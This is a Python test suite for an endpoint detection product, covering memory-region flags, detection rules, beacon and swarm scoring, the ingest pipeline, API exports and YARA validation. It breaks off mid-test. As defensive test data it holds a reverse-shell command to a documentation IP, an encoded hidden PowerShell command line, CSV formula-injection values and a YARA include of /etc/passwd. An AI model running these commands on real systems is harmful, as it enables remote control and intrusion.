from __future__ import annotations

import csv
import io
import json
import os
import subprocess
import sys
import threading
import time
import unittest
from unittest import mock

from django.conf import settings
from django.test import SimpleTestCase, TestCase, TransactionTestCase
from rest_framework.test import APIClient

from edr import runtime
from edr.collector import memory
from edr.collector._linux import parse_maps
from edr.collector._winconst import (MEM_IMAGE, MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
                                     PAGE_EXECUTE_WRITECOPY, classify_region)
from edr.collector.collector import Collector, host_info
from edr.engine import netintel, pipeline, rules, yara_scanner
from edr.engine.anomaly import AnomalyEngine
from edr.models import Alert, Connection, Host, Process

IS_LINUX = sys.platform.startswith("linux")


def _host(os_name="Windows", host_id="h1"):
    return {"host_id": host_id, "hostname": "WS-01", "os_name": os_name, "os_version": "Win11", "arch": "x86_64",
            "ip_addresses": ["10.0.0.5"], "agent_version": "t", "is_admin": True, "capabilities": {}}


def _start(pid, ppid, name, exe, cmd="", t=1000.0):
    return {"type": "process_start", "ts": t, "pid": pid, "ppid": ppid, "create_time": t, "name": name, "exe": exe,
            "cmdline": cmd or name, "cwd": "", "username": "u", "sha256": "", "exe_deleted": False, "agent": False}


class MemoryParsingTests(SimpleTestCase):
    MAPS = (
        "55d0c0000000-55d0c0021000 r-xp 00000000 08:01 123 /usr/bin/python3\n"
        "7f0000000000-7f0000002000 rwxp 00000000 00:00 0 \n"
        "7f0000010000-7f0000012000 r-xp 00000000 00:01 9 /memfd:payload (deleted)\n"
        "7f0000020000-7f0000022000 r-xp 00000000 08:01 5 /tmp/evil.so\n"
        "7ffc00000000-7ffc00021000 rw-p 00000000 00:00 0 [stack]\n"
    )

    def test_parse_maps_flags(self):
        r = parse_maps(self.MAPS)
        self.assertEqual(len(r), 5)
        self.assertFalse(r[0].unbacked or r[0].rwx or r[0].susp_path)
        self.assertTrue(r[1].rwx and r[1].unbacked)
        self.assertTrue(r[2].unbacked and r[2].susp_path and r[2].kind == "memfd")
        self.assertTrue(r[3].susp_path and not r[3].unbacked)
        self.assertFalse(memory.is_flagged(r[4]))

    def test_windows_classification(self):
        rwx = classify_region(MEM_PRIVATE, PAGE_EXECUTE_READWRITE, "")
        self.assertTrue(rwx["rwx"] and rwx["unbacked"] and rwx["protect"] == "PAGE_EXECUTE_READWRITE")
        img = classify_region(MEM_IMAGE, PAGE_EXECUTE_WRITECOPY, "\\Device\\HarddiskVolume3\\Windows\\a.dll")
        self.assertFalse(img["rwx"] or img["unbacked"])  # loader behaviour is not RWX
        self.assertFalse(classify_region(MEM_IMAGE, PAGE_EXECUTE_READ, "x")["rwx"])

    def test_header_detection(self):
        pe = bytearray(0x100)
        pe[:2] = b"MZ"
        pe[0x3C:0x40] = (0x80).to_bytes(4, "little")
        pe[0x80:0x84] = b"PE\x00\x00"
        self.assertEqual(memory.detect_header(bytes(pe)), "MZ-PE")
        self.assertEqual(memory.detect_header(b"\x7fELF\x02\x01"), "ELF")
        self.assertEqual(memory.detect_header(b"hello"), "")


class RuleTests(SimpleTestCase):
    def ctx(self, name, parent=None, os_name="Windows", **kw):
        return rules.Ctx(proc={"name": name, "exe": kw.pop("exe", ""), "cmdline": kw.pop("cmdline", name), "pid": 1,
                               "exe_deleted": False, "is_agent": False}, ancestors=[{"name": parent, "exe": ""}] if parent else [],
                         os_name=os_name, **kw)

    def test_office_spawns_shell_is_critical(self):
        f = rules.evaluate(self.ctx("cmd.exe", "winword.exe"))
        self.assertEqual(f[0].rule_id, "LIN-001")
        self.assertGreaterEqual(rules.risk_score(f), 80)

    def test_noisy_or_combination(self):
        f = rules.evaluate(self.ctx("powershell.exe", "winword.exe",
                                    cmdline="powershell.exe -nop -w hidden -enc " + "A" * 40))
        self.assertGreater(rules.risk_score(f), 95)
        self.assertLessEqual(rules.risk_score(f), 100)

    def test_benign_process_has_no_findings(self):
        self.assertEqual(rules.evaluate(self.ctx("notepad.exe", "explorer.exe")), [])

    def test_svchost_masquerade(self):
        f = rules.evaluate(self.ctx("svchost.exe", "explorer.exe", exe="C:\\Users\\bob\\svchost.exe"))
        self.assertTrue({"LIN-004", "LIN-005"} <= {x.rule_id for x in f})

    def test_kernel_thread_masquerade(self):
        f = rules.evaluate(self.ctx("kworker/u8:1", os_name="Linux", exe="/dev/shm/.k", cmdline="[kworker/u8:1]"))
        self.assertIn("LIN-006", [x.rule_id for x in f])
        self.assertEqual(rules.evaluate(self.ctx("kworker/u8:1", os_name="Linux", exe="", cmdline="")), [])

    def test_memory_rwx_jit_downweighted(self):
        mem = {"summary": {"rwx_regions": 1}, "regions": [{"start": 4096, "size": 4096, "perms": "rwxp", "rwx": True,
                                                              "unbacked": True, "header": "", "entropy": 1.0}]}
        node = rules.evaluate(self.ctx("node", os_name="Linux", mem=mem))
        unk = rules.evaluate(self.ctx("updater", os_name="Linux", mem=mem))
        self.assertLess(rules.risk_score(node), 20)
        self.assertGreaterEqual(rules.risk_score(unk), 40)

    def test_jit_host_recognised_by_exe_name_when_thread_renamed(self):
        mem = {"summary": {"rwx_regions": 1}, "regions": [{"start": 4096, "size": 4096, "perms": "rwxp", "rwx": True,
                                                              "unbacked": True, "header": "", "entropy": 1.0}]}
        c = self.ctx("MainThread", os_name="Linux", mem=mem, exe="/opt/pw-browsers/chrome-headless-shell")
        self.assertLess(rules.risk_score(rules.evaluate(c)), 20)
        c2 = self.ctx("MainThread", os_name="Linux", mem=mem, exe="/opt/tools/mystery", jit_extra=("mystery",))
        self.assertLess(rules.risk_score(rules.evaluate(c2)), 20)

    def _shared_ctx(self, name, regs, prev, **kw):
        mem = {"summary": {"rwx_regions": sum(1 for r in regs if r.get("rwx")), "unbacked_exec": len(regs)}, "regions": regs}
        return self.ctx(name, mem=mem, region_prev=prev, shared_min=8, **kw)

    def test_shared_region_is_downweighted_but_still_reported(self):
        r1 = {"start": 4096, "size": 65536, "kind": "private", "protect": "PAGE_EXECUTE_READ", "perms": "r-x-",
              "unbacked": True, "rwx": False, "header": "", "entropy": 1.803}
        sig = rules.region_sig(r1)
        widespread = {sig: (60, 40)}
        f = rules.evaluate(self._shared_ctx("updater.exe", [r1], widespread))
        m = next(x for x in f if x.rule_id == "MEM-003")
        self.assertLessEqual(m.weight, 5)
        self.assertIn("60 processes", m.description)
        # the same region seen in only a few processes keeps full weight
        f2 = rules.evaluate(self._shared_ctx("updater.exe", [r1], {sig: (3, 3)}))
        self.assertEqual(next(x for x in f2 if x.rule_id == "MEM-003").weight, 35)
        # many processes but a single program name (a worker pool): not treated as shared
        f3 = rules.evaluate(self._shared_ctx("updater.exe", [r1], {sig: (60, 1)}))
        self.assertEqual(next(x for x in f3 if x.rule_id == "MEM-003").weight, 35)
        # switched off
        off = self._shared_ctx("updater.exe", [r1], widespread)
        off.shared_min = 0
        self.assertEqual(next(x for x in rules.evaluate(off) if x.rule_id == "MEM-003").weight, 35)

    def test_shared_check_never_hides_a_unique_region_or_a_pe_header(self):
        shared = {"start": 4096, "size": 4096, "kind": "private", "protect": "PAGE_EXECUTE_READWRITE", "perms": "rwx-",
                  "unbacked": True, "rwx": True, "header": "", "entropy": 0.5}
        unique = dict(shared, start=8192, size=12288, entropy=6.9)
        prev = {rules.region_sig(shared): (30, 10)}
        f = rules.evaluate(self._shared_ctx("x.exe", [shared, unique], prev))
        m = next(x for x in f if x.rule_id == "MEM-001")
        self.assertEqual(m.weight, 40)                                   # one region is unique: full weight
        self.assertEqual(m.evidence["regions"][0]["size"], 12288)        # unique region listed first
        pe = dict(shared, header="MZ-PE", size=8192)
        prev2 = {rules.region_sig(pe): (30, 10), rules.region_sig(shared): (30, 10)}
        ids = [x.rule_id for x in rules.evaluate(self._shared_ctx("x.exe", [pe], prev2))]
        self.assertIn("MEM-002", ids)                                    # reflective PE stays at 90 whatever the prevalence

    @staticmethod
    def _conn(ip, port, ts=1.0):
        return {"direction": "outbound", "proto": "tcp", "raddr": ip, "rport": port, "laddr": "10.0.0.5", "lport": 50000,
                "scope": "public", "ts": ts}

    def test_uncommon_port_is_one_stable_finding_per_process(self):
        a = rules.evaluate(self.ctx("sync.exe", conns=[self._conn("203.0.113.5", 9001)]))
        b = rules.evaluate(self.ctx("sync.exe", conns=[self._conn("203.0.113.5", 9001), self._conn("203.0.113.6", 9002)]))
        fa = next(x for x in a if x.rule_id == "NET-004")
        fb = next(x for x in b if x.rule_id == "NET-004")
        self.assertEqual((fa.suffix, fb.suffix), ("", ""))          # same alert key: a new peer updates it, no new alert
        self.assertEqual(fa.weight, 20)
        self.assertEqual(len([x for x in b if x.rule_id == "NET-004"]), 1)
        self.assertEqual(fb.evidence["destinations"], ["203.0.113.5:9001", "203.0.113.6:9002"])

    def test_peer_swarm_scores_low_but_few_destinations_do_not(self):
        swarm = [self._conn(f"198.51.100.{i}", 20000 + i * 7, ts=100.0 + i) for i in range(1, 12)]
        f = next(x for x in rules.evaluate(self.ctx("sync.exe", conns=swarm)) if x.rule_id == "NET-004")
        self.assertLess(f.weight, rules.MIN_ALERT_WEIGHT)
        self.assertIn("peer-to-peer swarm", f.description)
        few = swarm[:3]
        self.assertEqual(next(x for x in rules.evaluate(self.ctx("sync.exe", conns=few)) if x.rule_id == "NET-004").weight, 20)
        scan = [self._conn(f"198.51.100.{i}", 31337, ts=100.0 + i) for i in range(1, 40)]   # one port, many hosts
        self.assertEqual(next(x for x in rules.evaluate(self.ctx("sync.exe", conns=scan)) if x.rule_id == "NET-004").weight, 20)

    def test_beacon_inside_a_swarm_is_low_confidence(self):
        beacon = [self._conn("198.51.100.200", 31989, ts=100.0 + 30 * i) for i in range(8)]
        swarm = [self._conn(f"198.51.100.{i}", 20000 + i * 7, ts=100.0 + i) for i in range(1, 12)]
        alone = next(x for x in rules.evaluate(self.ctx("sync.exe", conns=beacon)) if x.rule_id == "NET-005")
        inside = next(x for x in rules.evaluate(self.ctx("sync.exe", conns=beacon + swarm)) if x.rule_id == "NET-005")
        self.assertEqual(alone.weight, 55)
        self.assertLess(inside.weight, rules.MIN_ALERT_WEIGHT)

    def test_anomaly_alone_never_reaches_the_alert_threshold(self):
        for a in (0.6, 0.8, 1.0):
            f = rules.evaluate(self.ctx("bigapp.exe", anomaly=a))
            self.assertEqual([x.rule_id for x in f], ["ANOM-001"])
            self.assertLess(rules.risk_score(f), 40)
        self.assertEqual(rules.evaluate(self.ctx("bigapp.exe", anomaly=0.5)), [])

    def test_reflective_pe_is_high(self):
        mem = {"summary": {}, "regions": [{"start": 4096, "size": 8192, "perms": "rwxp", "rwx": True, "unbacked": True,
                                              "header": "MZ-PE", "entropy": 5.0}]}
        f = rules.evaluate(self.ctx("node", os_name="Linux", mem=mem))  # even JIT hosts: PE in private memory
        self.assertIn("MEM-002", [x.rule_id for x in f])
        self.assertGreaterEqual(rules.risk_score(f), 90)

    def test_reverse_shell_cmdline_and_net(self):
        conn = {"direction": "outbound", "proto": "tcp", "raddr": "203.0.113.9", "rport": 4444, "laddr": "10.0.0.5", "lport": 5000,
                "scope": "public", "ts": 1.0}
        f = rules.evaluate(self.ctx("bash", os_name="Linux", cmdline="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", conns=[conn]))
        ids = {x.rule_id for x in f}
        self.assertTrue({"CMD-009", "NET-001"} <= ids)

    def test_beacon_detection(self):
        conns = [{"direction": "outbound", "proto": "tcp", "raddr": "198.51.100.7", "rport": 443, "laddr": "x", "lport": i,
                  "scope": "public", "ts": 100.0 + 30 * i} for i in range(8)]
        f = rules.evaluate(self.ctx("updater", os_name="Linux", conns=conns))
        self.assertIn("NET-005", [x.rule_id for x in f])
        irregular = [0, 5, 70, 90, 400, 410, 900, 1500]
        jitter = [dict(c, ts=100.0 + irregular[i]) for i, c in enumerate(conns)]
        self.assertNotIn("NET-005", [x.rule_id for x in rules.evaluate(self.ctx("updater", os_name="Linux", conns=jitter))])


class NetIntelTests(SimpleTestCase):
    def test_scopes(self):
        self.assertEqual(netintel.classify_ip("10.1.2.3"), "private")
        self.assertEqual(netintel.classify_ip("127.0.0.1"), "loopback")
        self.assertEqual(netintel.classify_ip("100.64.1.1"), "cgnat")
        self.assertEqual(netintel.classify_ip("8.8.8.8"), "public")
        self.assertEqual(netintel.classify_ip("fe80::1"), "link-local")

    def test_seed_lookup_and_custom_file(self):
        g = netintel.GeoAsn()
        self.assertEqual(g.lookup("8.8.8.8")["asn"], 15169)
        self.assertEqual(g.lookup("203.0.113.5"), {})
        import tempfile, os
        with tempfile.NamedTemporaryFile("w", suffix=".tsv", delete=False) as fh:
            fh.write("203.0.113.0\t203.0.113.255\t64496\tZZ\tTEST-NET-3\n")
        try:
            g2 = netintel.GeoAsn(fh.name)
            self.assertEqual(g2.lookup("203.0.113.5")["asn"], 64496)
        finally:
            os.unlink(fh.name)

    def test_entropy_dga(self):
        self.assertTrue(netintel.looks_dga("xk3j9q2mz7vb1ptw.com"))
        self.assertFalse(netintel.looks_dga("www.example.com"))
        self.assertIsNone(netintel.beacon_stats([1, 2, 3]))


class AnomalyTests(SimpleTestCase):
    def test_outlier_scores_higher(self):
        import random
        random.seed(1)
        rows = [{"name": "app", "exe": "/usr/bin/app", "cmdline": "app --x", "last_cpu": random.random() * 3,
                 "last_rss": random.randint(20, 90) * 1048576, "last_threads": random.randint(1, 8),
                 "mem_summary": {"rwx_regions": 0, "unbacked_exec": 0, "exec_bytes": 2_000_000}, "net_out": random.randint(0, 2),
                 "net_remotes": 1, "net_listen": 0, "depth": 2, "exe_freq": 50} for _ in range(500)]
        eng = AnomalyEngine()
        self.assertFalse(eng.train(rows[:10], 400))
        self.assertTrue(eng.train(rows, 400))
        odd = dict(rows[0], mem_summary={"rwx_regions": 6, "unbacked_exec": 9, "pe_in_private": 2, "exec_bytes": 90_000_000},
                   net_out=40, net_remotes=25, exe="/tmp/x", exe_freq=1, last_cpu=250.0, name="q9zk")
        self.assertGreater(eng.score(odd), 0.9)
        self.assertLess(eng.score(rows[1]), 0.6)


class PipelineTests(TestCase):
    def test_office_chain_creates_critical_alert(self):
        batch = {"host": _host(), "events": [
            _start(100, 4, "explorer.exe", "C:\\Windows\\explorer.exe", t=900.0),
            _start(200, 100, "WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", t=1000.0),
            _start(300, 200, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami", t=1010.0),
            {"type": "net_connect", "ts": 1015.0, "pid": 300, "create_time": 1010.0, "direction": "outbound", "proto": "tcp",
             "laddr": "10.0.0.5", "lport": 50000, "raddr": "8.8.8.8", "rport": 4444, "status": "ESTABLISHED"},
        ]}
        res = pipeline.ingest(batch)
        self.assertEqual(res["processes_new"], 3)
        cmd = Process.objects.get(pid=300)
        self.assertEqual(cmd.parent.name, "WINWORD.EXE")
        self.assertEqual(cmd.parent.parent.name, "explorer.exe")
        self.assertGreaterEqual(cmd.risk_score, 90)
        alerts = Alert.objects.filter(process=cmd)
        self.assertTrue(alerts.filter(rule_id="LIN-001", severity="critical").exists())
        self.assertTrue(alerts.filter(rule_id="NET-001", remote_ip="8.8.8.8").exists())
        self.assertEqual(Process.objects.get(pid=100).risk_score, 0)

        before = Alert.objects.count()
        pipeline.ingest(batch)                                    # idempotent
        self.assertEqual(Alert.objects.count(), before)

    def test_pid_reuse_creates_new_instance_and_exit_recorded(self):
        pipeline.ingest({"host": _host(), "events": [_start(50, 1, "a.exe", "C:\\a.exe", t=100.0)]})
        pipeline.ingest({"host": _host(), "events": [{"type": "process_exit", "ts": 200.0, "pid": 50, "create_time": 100.0},
                                                       _start(50, 1, "b.exe", "C:\\b.exe", t=300.0)]})
        self.assertEqual(Process.objects.filter(pid=50).count(), 2)
        self.assertIsNotNone(Process.objects.get(pid=50, name="a.exe").ended_at)
        self.assertIsNone(Process.objects.get(pid=50, name="b.exe").ended_at)

    def test_invalid_events_are_dropped(self):
        res = pipeline.ingest({"host": _host(), "events": [{"type": "bogus"}, {"type": "process_start"}, "x"]})
        self.assertEqual(res["dropped"], 3)


class LauncherAndRoutingTests(TestCase):
    def test_port_check_sees_a_busy_port(self):
        import socket
        from aether.launcher import _port_free
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            sock.listen(1)
            self.assertFalse(_port_free("127.0.0.1", sock.getsockname()[1]))
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            free = sock.getsockname()[1]
        self.assertTrue(_port_free("127.0.0.1", free))

    def test_port_check_ignores_time_wait_after_a_restart(self):
        import socket
        from aether.launcher import _port_free
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        cli = socket.create_connection(("127.0.0.1", port))
        conn, _ = srv.accept()
        conn.close()          # server side closes first, which leaves TIME_WAIT behind
        cli.close()
        srv.close()
        self.assertTrue(_port_free("127.0.0.1", port))

    def test_is_aetheredr_is_false_for_a_closed_port(self):
        import socket
        from aether.launcher import _is_aetheredr
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            closed = sock.getsockname()[1]
        self.assertFalse(_is_aetheredr("127.0.0.1", closed))

    def test_unknown_api_path_is_json(self):
        r = APIClient().get("/api/does-not-exist/", HTTP_X_AETHER_KEY=settings.API_KEY)
        self.assertEqual(r.status_code, 404)
        self.assertEqual(r["Content-Type"], "application/json")


class ReconcileAndPrevalenceTests(TestCase):
    def setUp(self):
        pipeline._PREV_CACHE.clear()

    def test_restart_ends_processes_that_vanished_while_nothing_watched(self):
        pipeline.ingest({"host": _host(), "events": [_start(10, 1, "a.exe", "C:\\a.exe", t=100.0),
                                                       _start(11, 1, "b.exe", "C:\\b.exe", t=101.0)]})
        self.assertEqual(Process.objects.filter(ended_at__isnull=True).count(), 2)
        # collector restarts: only b.exe is still alive (same pid and create time), c.exe is new
        res = pipeline.ingest({"host": _host(), "events": [_start(11, 1, "b.exe", "C:\\b.exe", t=101.0),
                                                             _start(12, 1, "c.exe", "C:\\c.exe", t=200.0)],
                               "live": [[11, 101.0], [12, 200.0]]})
        self.assertEqual(res["reconciled"], 1)
        self.assertIsNotNone(Process.objects.get(pid=10).ended_at)
        self.assertIsNone(Process.objects.get(pid=11).ended_at)
        self.assertIsNone(Process.objects.get(pid=12).ended_at)

    def test_live_list_is_safe_against_bad_input_and_chunking(self):
        pipeline.ingest({"host": _host(), "events": [_start(10, 1, "a.exe", "C:\\a.exe", t=100.0)]})
        pipeline.ingest({"host": _host(), "events": [], "live": [["x", "y"]]})            # malformed: ignored
        pipeline.ingest({"host": _host(), "events": [], "live": []})                      # empty: ignored
        self.assertIsNone(Process.objects.get(pid=10).ended_at)
        # a chunk that carries none of the starts must not end processes the full list names
        pipeline.ingest({"host": _host(), "events": [], "live": [[10, 100.0]]})
        self.assertIsNone(Process.objects.get(pid=10).ended_at)

    def test_first_collector_poll_lists_live_processes_once(self):
        c = Collector(interval=0.2, memscan=False)
        first, second = c.poll(), c.poll()
        self.assertIn("live", first)
        self.assertNotIn("live", second)
        self.assertTrue(any(pid == os.getpid() for pid, _ in first["live"]))

    def test_ingest_api_accepts_live(self):
        r = APIClient().post("/api/ingest/", {"host": _host(host_id="h9"), "events": [], "live": [[1, 1.0]]},
                             format="json", HTTP_X_AETHER_KEY=settings.API_KEY)
        self.assertEqual(r.status_code, 202, r.content)

    def test_widespread_region_lowers_risk_across_programs(self):
        reg = {"start": 4096, "size": 65536, "perms": "r-x-", "protect": "PAGE_EXECUTE_READ", "kind": "private", "path": "",
               "executable": True, "rwx": False, "unbacked": True, "susp_path": False, "header": "", "entropy": 1.803}
        odd = dict(reg, start=9999, size=8192, entropy=7.0)
        events = []
        for i in range(10):
            events.append(_start(100 + i, 1, f"app{i}.exe", f"C:\\Apps\\app{i}.exe", t=1000.0 + i))
        events.append(_start(200, 1, "odd.exe", "C:\\Apps\\odd.exe", t=1100.0))
        pipeline.ingest({"host": _host(), "events": events})
        for i in range(10):
            p = Process.objects.get(pid=100 + i)
            Process.objects.filter(pk=p.pk).update(mem_regions=[dict(reg, start=4096 * (i + 1))],
                                                  mem_summary={"unbacked_exec": 1}, mem_scanned_at=p.started_at)
        o = Process.objects.get(pid=200)
        Process.objects.filter(pk=o.pk).update(mem_regions=[odd], mem_summary={"unbacked_exec": 1}, mem_scanned_at=o.started_at)
        pipeline._PREV_CACHE.clear()
        host = Host.objects.get()
        pipeline.evaluate_processes(host, list(Process.objects.values_list("id", flat=True)))
        shared = Process.objects.get(pid=100)
        self.assertLess(shared.risk_score, 10)
        self.assertEqual(shared.findings[0]["weight"], 5)
        self.assertGreaterEqual(Process.objects.get(pid=200).risk_score, 35)   # unique region keeps its weight


class ApiTests(TestCase):
    def setUp(self):
        self.c = APIClient()
        self.key = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        pipeline.ingest({"host": _host(), "events": [
            _start(200, 4, "WINWORD.EXE", "C:\\Office\\WINWORD.EXE", t=1000.0),
            _start(300, 200, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", t=1010.0)]})

    def test_auth_required(self):
        self.assertEqual(self.c.get("/api/alerts/").status_code, 401)
        self.assertEqual(self.c.get("/api/alerts/", HTTP_X_AETHER_KEY="wrong").status_code, 401)
        self.assertEqual(self.c.get("/api/health/").status_code, 200)
        self.assertEqual(self.c.get("/api/alerts/", **self.key).status_code, 200)

    def test_ingest_endpoint(self):
        body = {"host": _host(host_id="h2"), "events": [_start(7, 1, "x.exe", "C:\\x.exe", t=5.0)]}
        r = self.c.post("/api/ingest/", body, format="json", **self.key)
        self.assertEqual(r.status_code, 202, r.content)
        self.assertEqual(r.json()["processes_new"], 1)
        self.assertEqual(self.c.post("/api/ingest/", {"host": {}, "events": []}, format="json", **self.key).status_code, 400)

    def test_alert_lifecycle_and_filters(self):
        r = self.c.get("/api/alerts/?severity=critical", **self.key).json()
        self.assertGreaterEqual(r["count"], 1)
        aid = r["results"][0]["id"]
        p = self.c.patch(f"/api/alerts/{aid}/", {"status": "ack"}, format="json", **self.key)
        self.assertEqual(p.json()["status"], "ack")
        self.assertEqual(self.c.patch(f"/api/alerts/{aid}/", {"status": "nonsense"}, format="json", **self.key).status_code, 400)
        self.assertEqual(self.c.get(f"/api/alerts/?since_id={aid}", **self.key).json()["count"], 0)

    def test_process_detail_and_graph(self):
        cmd = Process.objects.get(pid=300)
        d = self.c.get(f"/api/processes/{cmd.id}/", **self.key).json()
        self.assertEqual(d["ancestors"][0]["name"], "WINWORD.EXE")
        self.assertTrue(d["findings"])
        g = self.c.get("/api/graph/", **self.key).json()
        names = {n["name"] for n in g["nodes"]}
        self.assertTrue({"cmd.exe", "WINWORD.EXE"} <= names)  # risky node plus its ancestor
        by = {n["name"]: n for n in g["nodes"]}
        self.assertEqual(by["cmd.exe"]["parent"], by["WINWORD.EXE"]["id"])
        f = self.c.get(f"/api/graph/?focus={by['WINWORD.EXE']['id']}", **self.key).json()
        self.assertIn("cmd.exe", {n["name"] for n in f["nodes"]})

    def test_overview_and_reports(self):
        o = self.c.get("/api/overview/", **self.key).json()
        self.assertEqual(len(o["timeline"]), 24)
        self.assertGreaterEqual(o["stats"]["critical"], 1)
        pdf = self.c.get("/api/reports/export/?type=pdf", **self.key)
        self.assertEqual(pdf.status_code, 200)
        self.assertTrue(pdf.content.startswith(b"%PDF"))
        docx = self.c.get("/api/reports/export/?type=docx", **self.key)
        self.assertTrue(docx.content.startswith(b"PK"))
        self.assertEqual(self.c.get("/api/reports/export/?type=exe", **self.key).status_code, 400)

    def test_process_export_json_and_csv(self):
        j = self.c.get("/api/processes/export/", **self.key)
        self.assertEqual(j.status_code, 200)
        self.assertIn("attachment", j["Content-Disposition"])
        doc = json.loads(j.content)
        self.assertEqual(doc["meta"]["exported"], len(doc["processes"]))
        self.assertFalse(doc["meta"]["truncated"])
        by = {r["name"]: r for r in doc["processes"]}
        self.assertIn("cmd.exe", by)
        self.assertNotIn("WINWORD.EXE", by)                      # score 0: not flagged
        cmd = by["cmd.exe"]
        self.assertEqual(cmd["lineage"].split(" > ")[-1], "cmd.exe[300]")
        self.assertIn("WINWORD.EXE[200]", cmd["lineage"])
        self.assertTrue(any(f["rule_id"] == "LIN-001" for f in cmd["findings"]))
        self.assertEqual(cmd["severity"], "critical")
        self.assertTrue(any(e["rule_id"] == "LIN-001" for e in doc["summary"]["by_rule"]))
        self.assertEqual(doc["summary"]["by_severity"]["critical"], 1)

        c = self.c.get("/api/processes/export/?type=csv", **self.key)
        self.assertTrue(c.content.startswith(b"\xef\xbb\xbf"))
        rows = list(csv.DictReader(io.StringIO(c.content.decode("utf-8-sig"))))
        self.assertTrue(rows)
        self.assertEqual({r["process"] for r in rows}, {"cmd.exe"})
        self.assertIn("LIN-001", {r["rule_id"] for r in rows})
        self.assertEqual(rows[0]["state"], "active")

        # filters: nothing reaches an impossible bar, `alive=0` excludes running processes, bad type is rejected
        self.assertEqual(json.loads(self.c.get("/api/processes/export/?min_score=100", **self.key).content)["processes"], [])
        self.assertEqual(json.loads(self.c.get("/api/processes/export/?alive=0", **self.key).content)["processes"], [])
        self.assertEqual(self.c.get("/api/processes/export/?type=xml", **self.key).status_code, 400)
        self.assertEqual(self.c.get("/api/processes/export/").status_code, 401)

    def test_process_export_silenced_findings_and_csv_injection(self):
        cmd = Process.objects.get(pid=300)
        Process.objects.filter(pk=cmd.pk).update(
            name="=cmd()", cmdline="+HYPERLINK(1)",
            muted=[{"rule_id": "MEM-001", "title": "RWX", "weight": 40, "description": "x", "evidence": {}, "suppression": 7}])
        doc = json.loads(self.c.get("/api/processes/export/", **self.key).content)
        self.assertEqual(doc["processes"][0]["silenced"][0]["rule_id"], "MEM-001")
        rows = list(csv.DictReader(io.StringIO(self.c.get("/api/processes/export/?type=csv", **self.key).content.decode("utf-8-sig"))))
        self.assertIn("silenced", {r["state"] for r in rows})
        for r in rows:
            for col in ("process", "cmdline"):
                self.assertNotIn(r[col][:1], ("=", "+", "-", "@"))   # neutralised against formula injection
        self.assertEqual(next(r for r in rows if r["state"] == "silenced")["silenced_by"], "7")

    def test_process_export_truncates_and_caps_connections(self):
        from edr.views import ProcessViewSet
        with mock.patch.object(ProcessViewSet, "EXPORT_CAP", 1):
            Process.objects.filter(pid=200).update(risk_score=55)
            doc = json.loads(self.c.get("/api/processes/export/", **self.key).content)
        self.assertEqual(len(doc["processes"]), 1)
        self.assertTrue(doc["meta"]["truncated"])
        self.assertEqual(doc["meta"]["matched"], 2)
        self.assertEqual(doc["processes"][0]["pid"], 300)         # highest risk first

    def test_yara_missing_degrades_gracefully(self):
        cmd = Process.objects.get(pid=300)
        with mock.patch.object(yara_scanner, "AVAILABLE", False):
            r = self.c.post(f"/api/processes/{cmd.id}/yara-scan/", {}, format="json", **self.key)
            self.assertEqual(r.status_code, 503)
            self.assertIn("requirements-yara", r.json()["detail"])
            self.assertEqual(self.c.get("/api/overview/", **self.key).json()["agent"]["yara"], False)
            self.assertFalse(self.c.get(f"/api/processes/{cmd.id}/", **self.key).json()["yara_available"])
            self.assertEqual(self.c.get("/api/alerts/", **self.key).status_code, 200)  # rest of the API unaffected

    @unittest.skipUnless(yara_scanner.AVAILABLE, "needs yara-python (requirements-yara.txt)")
    def test_yara_validation_blocks_includes(self):
        ok = self.c.post("/api/yara/validate/", {"rules": 'rule a { condition: true }'}, format="json", **self.key).json()
        self.assertTrue(ok["valid"])
        bad = self.c.post("/api/yara/validate/", {"rules": 'include "/etc/passwd"\nrule a { condition: true }'}, format="json", **self.key).json()
        self.assertFalse(bad["valid"])
        syn = self.c.post("/api/yara/validate/", {"rules": 'rule {'}, format="json", **self.key).json()
        self.assertFalse(syn["valid"])


class MemoryCoverageTests(TestCase):
    def setUp(self):
        self.c = APIClient()
        self.key = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        pipeline.ingest({"host": _host(), "events": [
            _start(200, 4, "lsass.exe", "C:\\Windows\\System32\\lsass.exe", t=1000.0),
            _start(300, 4, "calc.exe", "C:\\Windows\\System32\\calc.exe", t=1010.0)]})

    def test_unreadable_is_stored_reported_and_cleared_by_a_later_scan(self):
        pipeline.ingest({"host": _host(), "events": [
            {"type": "memory_unreadable", "ts": 1020.0, "pid": 200, "create_time": 1000.0, "reason": "protected"},
            {"type": "memory_unreadable", "ts": 1020.0, "pid": 300, "create_time": 1010.0, "reason": "nonsense"}]})
        self.assertEqual(Process.objects.get(pid=200).mem_unreadable, "protected")
        self.assertEqual(Process.objects.get(pid=300).mem_unreadable, "other")      # unknown reasons are not trusted
        cov = self.c.get("/api/system/", **self.key).json()["memory_coverage"]
        self.assertEqual((cov["protected"], cov["other"], cov["readable"]), (1, 1, 0))
        detail = self.c.get(f"/api/processes/{Process.objects.get(pid=200).id}/", **self.key).json()
        self.assertEqual(detail["mem_unreadable"], "protected")
        pipeline.ingest({"host": _host(), "events": [
            {"type": "memory_scan", "ts": 1030.0, "pid": 300, "create_time": 1010.0, "summary": {"rwx_regions": 0}, "regions": []}]})
        self.assertEqual(Process.objects.get(pid=300).mem_unreadable, "")
        cov = self.c.get("/api/system/", **self.key).json()["memory_coverage"]
        self.assertEqual((cov["protected"], cov["other"], cov["readable"]), (1, 0, 1))

    def test_collector_reports_a_blind_spot_once_and_keeps_gone_quiet(self):
        from unittest import mock
        from edr.collector import memory as memlib
        from edr.collector.collector import Collector
        col = Collector(memscan=True)
        if not col.memscan:
            self.skipTest("memory introspection not supported here")
        rec = {"next_mem": 0, "mem_stage": 0, "create_time": 1.0}
        col.known = {(4242, 1000): rec}
        with mock.patch.object(memlib, "analyze", side_effect=memlib.MemoryAccessError("x", "protected")):
            first = col._memory_events(10.0)
            rec["next_mem"] = 0
            second = col._memory_events(20.0)
